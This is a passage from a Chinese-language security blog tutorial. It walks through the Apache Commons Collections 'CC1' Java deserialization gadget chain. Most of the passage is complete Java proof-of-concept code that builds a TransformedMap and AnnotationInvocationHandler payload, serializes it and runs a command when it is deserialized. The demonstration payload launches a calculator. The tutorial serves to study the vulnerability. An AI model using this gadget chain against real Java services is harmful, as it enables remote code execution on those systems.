class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getDeclaredMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class,Class[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class,Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用构造方法对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        };</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"123"</span>,<span class="string">"456"</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//malicious map</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">finalMap</span> <span class="operator">=</span> (Map.Entry) myMap.entrySet().iterator().next();<span class="comment">//传入parent</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(finalMap);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) objectInputStream.readObject();</span><br><span class="line">        entry.setValue(<span class="string">"Anch0r"</span>);<span class="comment">//触发漏洞</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这里又发现了NotSerializableException错误，其中的<code>MapEntry</code>是不可序列化的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121164539714.png" alt="NotSerializableException"></p>
<p>这里就不通过序列化和反序列化表现了，直接删除序列化和反序列化的代码查看结果：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getDeclaredMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class,Class[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class,Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用构造方法对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        };</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"123"</span>,<span class="string">"456"</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//malicious map</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">finalMap</span> <span class="operator">=</span> (Map.Entry) myMap.entrySet().iterator().next();<span class="comment">//传入parent</span></span><br><span class="line">        finalMap.setValue(<span class="string">"anch0r"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>成功弹窗！</p>
<h3 id="5-AnotationInvocationHandler类"><a href="#5-AnotationInvocationHandler类" class="headerlink" title="5. AnotationInvocationHandler类"></a>5. AnotationInvocationHandler类</h3><p><code>AnotationInvocationHandler</code>类不是<code>Commons Collections</code>包中的内容了，它是jdk包中自带的类，位于<code>sun.reflect.annotation.AnotationInvocationHandler</code>,这个类很完美，因为它有一个自己的<code>readObject</code>方法，就是说该类可以配合实现反序列化漏洞。</p>
<p>我们就先来分析它的<code>readObject</code>方法的源码：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException {</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">//var2代表AnnotationType（注释类型） -》 为空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);<span class="comment">//根据【this.type】给var2赋值为一个实例</span></span><br><span class="line">        } <span class="keyword">catch</span> (IllegalArgumentException var9) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();<span class="comment">//var3为var2 Annotation中的[value:ElementType]</span></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();<span class="comment">//*****var4会直接将memberValues自身作为parent传入，和第五步我们自己构造的一模一样！！！如果没看懂的，建议看第五步仔细阅读。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) {<span class="comment">//如果var4中还有下一个key-Value对</span></span><br><span class="line">            <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next(); <span class="comment">//获取下一个key-value对，并赋值给var5</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();<span class="comment">//获取var5的key</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);<span class="comment">//在var3中查看有没有这个key，把结果赋值给var7</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) {<span class="comment">//如果var3中有这个key</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();<span class="comment">//获取这个key-Value对中的value</span></span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) {</span><br><span class="line">                    <span class="comment">//*****如果var7不是var8（value）的实例，而且 value不是ExceptionProxy的实例，call var5(Map)的setValue()方法</span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>我们看到了熟悉的<code>this.memberValues.entrySet().iterator();</code>，在后面还有<code>setValue()</code>，这已经足够我们利用了。上面代码<code>comment</code>中的<code>【this.type】</code>和<code>【this.memberValues】</code>都是可控的,在构造方法中可以传入，那么顺便看看其构造方法源码：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) {</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) {</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><code>memberValues</code>我们赋值为<code>TransformedMap.decorate()</code>的返回值，那<code>type</code>呢？我们可以发现<code>type</code>是一种<code>Annotation</code>（注释），如果大家有学习过<code>SpringBoot或Spring</code>的话，就会理解<code>Annotation</code>的意义。所以此处我们是要传一个Annotation的Class过去。再看<code>readObject()</code>中的逻辑：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">          ...</span><br><span class="line">var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);<span class="comment">//根据【this.type】给var2赋值为一个Annotation实例（实际会获取到注解的各种属性，包括注解元素，注解元素的默认值，生命周期，是否继承等等。）</span></span><br><span class="line">      <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();<span class="comment">//var3为var2 Annotation中的[value:ElementType]</span></span><br><span class="line">      <span class="keyword">while</span>(var4.hasNext()) {</span><br><span class="line">          <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next(); <span class="comment">//获取下一个entry</span></span><br><span class="line">          <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();<span class="comment">//获取var5的key</span></span><br><span class="line">          <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);<span class="comment">//在var3 memberTypes中查看有没有这个key，把结果赋值给var7</span></span><br><span class="line">          <span class="keyword">if</span> (var7 != <span class="literal">null</span>) {<span class="comment">//如果var3 memberTypes中有这个key</span></span><br><span class="line">              <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();<span class="comment">//获取这个key-Value对中的value</span></span><br><span class="line">              <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) {</span><br><span class="line">                  <span class="comment">//*****如果var7不是var8（value）的实例，而且 value不是ExceptionProxy的实例，触发漏洞</span></span><br><span class="line">                  var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">              }</span><br><span class="line">          }</span><br><span class="line">      }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>我们传入的这个type需要有<code>memberTypes</code>，且我们的<strong>map</strong>中的key必须要和<code>memberTypes</code>的key保持**一致。**跟踪<code>Annotation</code>这个<code>Class</code>，我们可以发现所有<code>Annotation</code>的<code>class。</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121171552950.png" alt="所有的Annotation的class文件"></p>
<p>这里我们可以简单分析一下：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Target {</span><br><span class="line">    ElementType[] value();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>此处<code>Target</code>的<code>memberTypes</code>就是 <code>[value:ElementType]</code> =》 <strong>key-value</strong>的形式。</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Retention {</span><br><span class="line">    RetentionPolicy <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>此处<code>Retention</code>的<code>memberTypes</code>就是 <code>[value:RetentionPolicy]</code> =》 <strong>key-value</strong>的形式`。</p>
<p>这些<code>Annotation</code>的元注解都可以通过<code>@</code>符号来调用，例如<code>@Target</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20210731232549977.png" alt="@Target"></p>
<p>因此我们可以选择传入<code>Target.class</code>或者<code>Retention.class</code>, <code>map</code>的<code>key</code>值为<code>value</code>。</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getDeclaredMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class,Class[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class,Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用构造方法对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        };</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"value"</span>,<span class="string">"anyContent"</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//malicious map</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<span class="comment">//反射获取该类</span></span><br><span class="line">        Constructor&lt;?&gt; aConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<span class="comment">//获取构造方法</span></span><br><span class="line">        aConstructor.setAccessible(<span class="literal">true</span>);<span class="comment">//取消构造方法限制</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aConstructor.newInstance(Target.class, myMap);<span class="comment">//传入参数和malicious map</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//触发漏洞</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>最后成功弹出计算器</p>
<h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>在学习利用链之前我总是在想，为啥大佬们要大费周章花很多心思来搞这么长的利用链？学完CC链的原理之后我明白了，在构造利用链时，他们肯定是在一步一步思索，怎么才能使漏洞的利用需要的条件更低，而接触范围更大等等，解决的办法也就是不断寻找其他突破口，去看其他的类，其他的方法来曲线救国，我想这也是我们在平常学习安全时所需要的能力，要学会不断去探索新的方法、新的可能性。</p>
<p><em><strong>参考文章：</strong></em></p>
<p>Java安全漫谈</p>
<p> <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7031">JAVA反序列化 - Commons-Collections组件</a></p>

  </div>
</article>
<!-- themes\cactus\layout\_partial\comments.ejs -->




    <div class="blog-post-comments">
        <div id="waline_thread"></div>
    </div>




        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a href="/categories/">categories</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
